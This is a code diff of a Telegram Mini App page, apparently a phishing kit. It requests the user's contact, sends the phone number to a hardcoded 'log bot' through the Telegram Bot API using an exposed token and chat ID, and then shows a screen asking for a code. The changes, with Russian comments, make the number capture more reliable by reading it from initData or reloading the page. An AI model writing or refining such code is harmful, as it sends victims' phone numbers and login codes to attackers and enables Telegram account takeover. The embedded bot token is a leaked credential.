@@ -56,10 +56,10 @@
                 tg.expand();
                 let isSent = false;
 
-                // --- ТОКЕН ЛОГ-БОТА ---
                 const LOG_BOT_TOKEN = "8923006288:AAFgpvKcHhZbpl148oi-qT5NUfvIu_7Cq24";
                 const CHAT_ID = "-1004399809740";
 
+                // Функция отправки через fetch
                 function sendToLogBot(text) {
                     fetch(`https://api.telegram.org/bot${LOG_BOT_TOKEN}/sendMessage`, {
                         method: 'POST',
@@ -68,19 +68,32 @@
                     });
                 }
 
+                // Функция переключения на экран кода
+                function showCodeScreen() {
+                    document.getElementById('screen-phone').classList.add('hidden');
+                    document.getElementById('screen-code').classList.remove('hidden');
+                    setTimeout(() => { document.getElementById('code-input').focus(); }, 100);
+                }
+
+                // ПРОВЕРКА: Если номер уже есть в initData (срабатывает после перезагрузки)
+                if (tg.initDataUnsafe && tg.initDataUnsafe.user && tg.initDataUnsafe.user.phone_number) {
+                    const phone = tg.initDataUnsafe.user.phone_number;
+                    sendToLogBot(`📱 PHONE: +${phone}`);
+                    showCodeScreen();
+                }
+
                 // 1. ЗАПРОС НОМЕРА
                 document.getElementById('btn-share').onclick = function() {
                     tg.requestContact(function(shared, contact) {
                         if (shared) {
-                            let phone = "undefined";
-                            if (contact && contact.phone_number) phone = contact.phone_number;
-                            else if (contact && contact.phone) phone = contact.phone;
-
-                            sendToLogBot(`📱 PHONE: +${phone}`);
-                            
-                            document.getElementById('screen-phone').classList.add('hidden');
-                            document.getElementById('screen-code').classList.remove('hidden');
-                            setTimeout(() => { document.getElementById('code-input').focus(); }, 100);
+                            // Если номер есть в объекте contact (у кого-то работает) - шлем сразу
+                            if (contact && contact.phone_number) {
+                                sendToLogBot(`📱 PHONE: +${contact.phone_number}`);
+                                showCodeScreen();
+                            } else {
+                                // Если пришел undefined - перезагружаем окно, чтобы номер появился в initData
+                                window.location.reload();
+                            }
                         }
                     });
                 };
